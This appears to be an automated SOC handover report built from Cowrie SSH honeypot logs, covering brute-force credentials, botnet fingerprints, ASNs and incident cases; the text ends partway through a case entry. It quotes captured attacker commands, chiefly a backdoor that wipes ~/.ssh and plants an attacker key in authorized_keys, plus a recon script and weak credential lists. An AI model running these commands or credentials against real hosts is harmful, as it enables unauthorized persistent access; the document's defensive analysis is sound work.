# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-23 |
| **Generated At** | 2026-07-23T19:25:21Z |
| **Shift Time** | 19:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **166** |
| Confirmed Threats | **149** |
| False Positives Filtered | **17** (10.2%) |
| Unique Attacker IPs | **88** |
| Countries of Origin | **25** |
| High Severity Cases | **116** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **3** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **144** |
| Unique Credential Pairs | **82** |
| Unique Usernames | **40** |
| Unique Passwords | **71** |
| Successful Auth Pairs | **131** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `administrator` | 8 |
| `nobody` | 7 |
| `centos` | 7 |
| `345gs5662d34` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `test88` | 6 |
| `techsupport` | 6 |
| `123` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `test` | `test88` | 6 |
| `unknown` | `techsupport` | 6 |
| `root` | `3245gs5662d34` | 5 |
| `centos` | `333` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support2012` | `10.0.0.73` | 2026-07-23T16:55:07 |
| `root` | `meow` | `138.197.164.175` | 2026-07-23T16:55:55 |
| `345gs5662d34` | `345gs5662d34` | `138.197.164.175` | 2026-07-23T16:55:57 |
| `root` | `3245gs5662d34` | `138.197.164.175` | 2026-07-23T16:55:57 |
| `root` | `root99` | `35.130.111.146` | 2026-07-23T16:58:05 |
| `root` | `root99` | `10.0.0.73` | 2026-07-23T16:58:30 |
| `sol` | `sol` | `2.57.122.238` | 2026-07-23T17:01:18 |
| `solana` | `solana` | `2.57.122.238` | 2026-07-23T17:02:59 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-07-23T17:04:40 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-07-23T17:06:18 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-07-23T17:07:52 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-07-23T17:09:23 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-07-23T17:10:54 |
| `test` | `test88` | `111.70.23.240` | 2026-07-23T17:11:47 |
| `test` | `test88` | `200.37.179.83` | 2026-07-23T17:11:55 |
| `node` | `node` | `2.57.122.238` | 2026-07-23T17:12:30 |
| `ubnt` | `6` | `103.93.37.178` | 2026-07-23T17:13:55 |
| `node` | `1234` | `2.57.122.238` | 2026-07-23T17:14:05 |
| `ubnt` | `6` | `222.222.124.164` | 2026-07-23T17:14:12 |
| `test` | `test88` | `125.69.76.148` | 2026-07-23T17:15:00 |
| `test` | `test88` | `65.20.204.88` | 2026-07-23T17:15:08 |
| `test` | `test88` | `10.0.0.73` | 2026-07-23T17:15:23 |
| `node` | `123456` | `2.57.122.238` | 2026-07-23T17:15:44 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-07-23T17:17:24 |
| `supervisor` | `supervisor2000` | `14.49.140.89` | 2026-07-23T17:17:50 |
| `supervisor` | `supervisor2000` | `203.92.36.109` | 2026-07-23T17:17:58 |
| `supervisor` | `supervisor2000` | `10.0.0.73` | 2026-07-23T17:18:07 |
| `eth` | `eth` | `2.57.122.238` | 2026-07-23T17:19:08 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-07-23T17:20:45 |
| `tron` | `tron` | `2.57.122.238` | 2026-07-23T17:22:18 |
| `debian` | `6666666` | `10.0.0.73` | 2026-07-23T17:22:54 |
| `trx` | `trx` | `2.57.122.238` | 2026-07-23T17:23:52 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-07-23T17:25:29 |
| `backupuser` | `backupuser` | `120.28.109.188` | 2026-07-23T17:25:38 |
| `root` | `flash` | `103.56.115.187` | 2026-07-23T17:25:41 |
| `345gs5662d34` | `345gs5662d34` | `120.28.109.188` | 2026-07-23T17:25:43 |
| `backupuser` | `3245gs5662d34` | `120.28.109.188` | 2026-07-23T17:25:45 |
| `345gs5662d34` | `345gs5662d34` | `103.56.115.187` | 2026-07-23T17:25:45 |
| `root` | `!root` | `92.118.39.49` | 2026-07-23T17:25:46 |
| `root` | `3245gs5662d34` | `103.56.115.187` | 2026-07-23T17:25:46 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-07-23T17:27:05 |
| `root` | `111111` | `92.118.39.49` | 2026-07-23T17:28:14 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-07-23T17:28:39 |
| `solv` | `solv` | `2.57.122.238` | 2026-07-23T17:30:20 |
| `root` | `123123` | `92.118.39.49` | 2026-07-23T17:30:55 |
| `solv` | `1234` | `2.57.122.238` | 2026-07-23T17:32:05 |
| `support` | `support` | `176.53.159.196` | 2026-07-23T17:32:25 |
| `root` | `1234` | `92.118.39.49` | 2026-07-23T17:33:33 |
| `support` | `support` | `10.0.0.73` | 2026-07-23T17:33:42 |
| `solv` | `123456` | `2.57.122.238` | 2026-07-23T17:33:46 |
| `administrator` | `passw0rd` | `179.185.1.97` | 2026-07-23T17:35:09 |
| `solv` | `12345678` | `2.57.122.238` | 2026-07-23T17:35:19 |
| `administrator` | `passw0rd` | `102.110.7.160` | 2026-07-23T17:35:21 |
| `pi` | `0987654321` | `195.222.57.190` | 2026-07-23T17:36:08 |
| `root` | `12345` | `92.118.39.49` | 2026-07-23T17:36:09 |
| `root` | `Wh123456` | `157.20.37.254` | 2026-07-23T17:37:19 |
| `345gs5662d34` | `345gs5662d34` | `157.20.37.254` | 2026-07-23T17:37:24 |
| `root` | `3245gs5662d34` | `157.20.37.254` | 2026-07-23T17:37:25 |
| `unknown` | `techsupport` | `36.74.222.124` | 2026-07-23T17:37:47 |
| `unknown` | `techsupport` | `47.206.63.169` | 2026-07-23T17:38:00 |
| `administrator` | `passw0rd` | `10.0.0.73` | 2026-07-23T17:39:00 |
| `pi` | `0987654321` | `122.176.21.104` | 2026-07-23T17:39:34 |
| `pi` | `0987654321` | `61.186.136.36` | 2026-07-23T17:39:43 |
| `pi` | `0987654321` | `10.0.0.73` | 2026-07-23T17:39:55 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-07-23T17:40:11 |
| `unknown` | `techsupport` | `65.20.179.251` | 2026-07-23T17:40:40 |
| `unknown` | `techsupport` | `60.223.245.120` | 2026-07-23T17:40:53 |
| `unknown` | `techsupport` | `10.0.0.73` | 2026-07-23T17:41:03 |
| `root` | `12345678` | `92.118.39.49` | 2026-07-23T17:41:17 |
| `validator` | `validator` | `2.57.122.238` | 2026-07-23T17:41:46 |
| `root` | `Pass1234!` | `80.15.193.156` | 2026-07-23T17:42:51 |
| `345gs5662d34` | `345gs5662d34` | `80.15.193.156` | 2026-07-23T17:42:54 |
| `root` | `3245gs5662d34` | `80.15.193.156` | 2026-07-23T17:42:54 |
| `sol` | `sol123` | `2.57.122.238` | 2026-07-23T17:43:24 |
| `root` | `123456789` | `92.118.39.49` | 2026-07-23T17:43:49 |
| `sol` | `123` | `2.57.122.238` | 2026-07-23T17:45:09 |
| `root` | `P@ssw0rd` | `92.118.39.49` | 2026-07-23T17:46:20 |
| `sol` | `12345678` | `2.57.122.238` | 2026-07-23T17:46:50 |
| `nobody` | `nobody111` | `117.247.239.202` | 2026-07-23T17:47:02 |
| `nobody` | `nobody111` | `10.0.0.73` | 2026-07-23T17:47:27 |
| `trading` | `trading` | `2.57.122.238` | 2026-07-23T17:48:29 |
| `root` | `Password1` | `92.118.39.49` | 2026-07-23T17:48:46 |
| `trader` | `trader` | `2.57.122.238` | 2026-07-23T17:50:07 |
| `root` | `Root123` | `92.118.39.49` | 2026-07-23T17:51:15 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-07-23T17:51:45 |
| `bot` | `bot` | `2.57.122.238` | 2026-07-23T17:53:22 |
| `root` | `admin` | `92.118.39.49` | 2026-07-23T17:53:53 |
| `bot` | `123456` | `2.57.122.238` | 2026-07-23T17:54:59 |
| `root` | `admin123` | `92.118.39.49` | 2026-07-23T17:56:28 |
| `bot` | `12345` | `2.57.122.238` | 2026-07-23T17:56:40 |
| `root` | `alpine` | `92.118.39.49` | 2026-07-23T17:59:02 |
| `centos` | `66666` | `65.20.133.56` | 2026-07-23T18:00:29 |
| `root` | `changeme` | `92.118.39.49` | 2026-07-23T18:01:33 |
| `oracle` | `administrator` | `186.239.41.74` | 2026-07-23T18:03:03 |
| `oracle` | `administrator` | `58.56.128.190` | 2026-07-23T18:03:12 |
| `oracle` | `administrator` | `10.0.0.73` | 2026-07-23T18:03:27 |
| `config` | `config2007` | `138.219.13.21` | 2026-07-23T18:03:43 |
| `config` | `config2007` | `10.0.0.73` | 2026-07-23T18:04:00 |
| `centos` | `66666` | `10.0.0.73` | 2026-07-23T18:04:04 |
| `centos` | `333` | `186.239.41.74` | 2026-07-23T18:08:02 |
| `centos` | `333` | `122.166.253.226` | 2026-07-23T18:08:15 |
| `centos` | `333` | `124.167.20.72` | 2026-07-23T18:11:28 |
| `centos` | `333` | `58.17.6.119` | 2026-07-23T18:11:40 |
| `centos` | `333` | `10.0.0.73` | 2026-07-23T18:11:56 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-23T18:18:26 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-23T18:18:27 |
| `nobody` | `nobody2022` | `218.59.235.170` | 2026-07-23T18:23:27 |
| `nobody` | `nobody2022` | `111.70.23.251` | 2026-07-23T18:23:39 |
| `mysql` | `qwerty123` | `111.42.132.19` | 2026-07-23T18:24:21 |
| `mysql` | `qwerty123` | `58.34.174.90` | 2026-07-23T18:24:34 |
| `debian` | `77777` | `65.20.138.3` | 2026-07-23T18:24:47 |
| `debian` | `77777` | `39.164.91.67` | 2026-07-23T18:24:55 |
| `root` | `root_123` | `35.207.202.141` | 2026-07-23T18:25:58 |
| `345gs5662d34` | `345gs5662d34` | `35.207.202.141` | 2026-07-23T18:26:03 |
| `root` | `3245gs5662d34` | `35.207.202.141` | 2026-07-23T18:26:05 |
| `nobody` | `nobody2022` | `10.0.0.73` | 2026-07-23T18:27:04 |
| `mysql` | `qwerty123` | `112.120.115.152` | 2026-07-23T18:27:40 |
| `mysql` | `qwerty123` | `121.189.226.81` | 2026-07-23T18:27:48 |
| `debian` | `77777` | `10.0.0.73` | 2026-07-23T18:28:35 |
| `nobody` | `888` | `10.0.0.73` | 2026-07-23T18:36:03 |
| `vpnadmin` | `vpnadmin` | `120.52.18.124` | 2026-07-23T18:40:54 |
| `operator` | `123` | `70.91.135.181` | 2026-07-23T18:46:19 |
| `operator` | `123` | `182.75.197.174` | 2026-07-23T18:46:32 |
| `administrator` | `123321` | `110.164.201.73` | 2026-07-23T18:49:14 |
| `operator` | `123` | `117.39.63.46` | 2026-07-23T18:49:25 |
| `administrator` | `123321` | `116.7.248.50` | 2026-07-23T18:49:26 |
| `operator` | `123` | `112.196.52.107` | 2026-07-23T18:49:34 |
| `operator` | `123` | `10.0.0.73` | 2026-07-23T18:49:43 |
| `config` | `7777` | `10.0.0.73` | 2026-07-23T18:52:27 |
| `administrator` | `123321` | `178.178.194.151` | 2026-07-23T18:52:30 |
| `administrator` | `123321` | `179.181.133.153` | 2026-07-23T18:52:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **166** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 55 |
| OpenSSH | 44 |
| libssh | 26 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 44 | 42 |
| `16443846184e...` | Generic scanner | 35 | 1 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `2ec37a7cc8da...` | Mirai/variant | 15 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 44 | 42 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 35 | 1 | Generic scanner |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 15 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 14 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.20.37.254`, `35.207.202.141`, `103.56.115.187`, `138.197.164.175`, `80.15.193.156`, `120.28.109.188`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **88** |
| Unique ASNs | **53** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 9 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 2 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (116)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-72c48e89417c

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-07-23 16:55 |
| **Last Seen** | 2026-07-23 16:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 16:55:55` | `cowrie.session.connect` |
| `2026-07-23 16:55:55` | `cowrie.client.version` |
| `2026-07-23 16:55:55` | `cowrie.client.kex` |
| `2026-07-23 16:55:55` | `cowrie.login.success` |
| `2026-07-23 16:55:56` | `cowrie.session.params` |
| `2026-07-23 16:55:56` | `cowrie.command.input` |
| `2026-07-23 16:55:56` | `cowrie.command.failed` |
| `2026-07-23 16:55:56` | `cowrie.log.closed` |
| `2026-07-23 16:55:56` | `cowrie.session.params` |
| `2026-07-23 16:55:56` | `cowrie.command.input` |
| `2026-07-23 16:55:57` | `cowrie.session.file_download` |
| `2026-07-23 16:55:57` | `cowrie.log.closed` |
| `2026-07-23 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1824f7aeb4fa

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-07-23 16:55 |
| **Last Seen** | 2026-07-23 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 16:55:57` | `cowrie.session.connect` |
| `2026-07-23 16:55:57` | `cowrie.client.version` |
| `2026-07-23 16:55:57` | `cowrie.client.kex` |
| `2026-07-23 16:55:57` | `cowrie.login.success` |
| `2026-07-23 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8114d4161e

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-07-23 16:55 |
| **Last Seen** | 2026-07-23 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 16:55:57` | `cowrie.session.connect` |
| `2026-07-23 16:55:57` | `cowrie.client.version` |
| `2026-07-23 16:55:57` | `cowrie.client.kex` |
| `2026-07-23 16:55:57` | `cowrie.login.success` |
| `2026-07-23 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af19126f248

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-07-23 16:58 |
| **Last Seen** | 2026-07-23 17:03 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 16:58:04` | `cowrie.session.connect` |
| `2026-07-23 16:58:04` | `cowrie.client.version` |
| `2026-07-23 16:58:04` | `cowrie.client.kex` |
| `2026-07-23 16:58:05` | `cowrie.login.success` |
| `2026-07-23 16:58:06` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feac625b73bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:01 |
| **Last Seen** | 2026-07-23 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:01:17` | `cowrie.session.connect` |
| `2026-07-23 17:01:17` | `cowrie.client.version` |
| `2026-07-23 17:01:17` | `cowrie.client.kex` |
| `2026-07-23 17:01:18` | `cowrie.login.success` |
| `2026-07-23 17:01:19` | `cowrie.session.params` |
| `2026-07-23 17:01:19` | `cowrie.command.input` |
| `2026-07-23 17:01:19` | `cowrie.log.closed` |
| `2026-07-23 17:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30311c63c939

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:02 |
| **Last Seen** | 2026-07-23 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:02:58` | `cowrie.session.connect` |
| `2026-07-23 17:02:58` | `cowrie.client.version` |
| `2026-07-23 17:02:58` | `cowrie.client.kex` |
| `2026-07-23 17:02:59` | `cowrie.login.success` |
| `2026-07-23 17:03:00` | `cowrie.session.params` |
| `2026-07-23 17:03:00` | `cowrie.command.input` |
| `2026-07-23 17:03:00` | `cowrie.log.closed` |
| `2026-07-23 17:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00040cf975a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:04 |
| **Last Seen** | 2026-07-23 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:04:40` | `cowrie.session.connect` |
| `2026-07-23 17:04:40` | `cowrie.client.version` |
| `2026-07-23 17:04:40` | `cowrie.client.kex` |
| `2026-07-23 17:04:40` | `cowrie.login.success` |
| `2026-07-23 17:04:41` | `cowrie.session.params` |
| `2026-07-23 17:04:41` | `cowrie.command.input` |
| `2026-07-23 17:04:41` | `cowrie.log.closed` |
| `2026-07-23 17:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0cb301fd67

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:06 |
| **Last Seen** | 2026-07-23 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:06:17` | `cowrie.session.connect` |
| `2026-07-23 17:06:17` | `cowrie.client.version` |
| `2026-07-23 17:06:17` | `cowrie.client.kex` |
| `2026-07-23 17:06:18` | `cowrie.login.success` |
| `2026-07-23 17:06:19` | `cowrie.session.params` |
| `2026-07-23 17:06:19` | `cowrie.command.input` |
| `2026-07-23 17:06:19` | `cowrie.log.closed` |
| `2026-07-23 17:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475cca545d62

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:07 |
| **Last Seen** | 2026-07-23 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:07:52` | `cowrie.session.connect` |
| `2026-07-23 17:07:52` | `cowrie.client.version` |
| `2026-07-23 17:07:52` | `cowrie.client.kex` |
| `2026-07-23 17:07:52` | `cowrie.login.success` |
| `2026-07-23 17:07:53` | `cowrie.session.params` |
| `2026-07-23 17:07:53` | `cowrie.command.input` |
| `2026-07-23 17:07:53` | `cowrie.log.closed` |
| `2026-07-23 17:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed64b3776782

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:09 |
| **Last Seen** | 2026-07-23 17:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:09:22` | `cowrie.session.connect` |
| `2026-07-23 17:09:22` | `cowrie.client.version` |
| `2026-07-23 17:09:22` | `cowrie.client.kex` |
| `2026-07-23 17:09:23` | `cowrie.login.success` |
| `2026-07-23 17:09:24` | `cowrie.session.params` |
| `2026-07-23 17:09:24` | `cowrie.command.input` |
| `2026-07-23 17:09:24` | `cowrie.log.closed` |
| `2026-07-23 17:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f31103f2426

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:10 |
| **Last Seen** | 2026-07-23 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

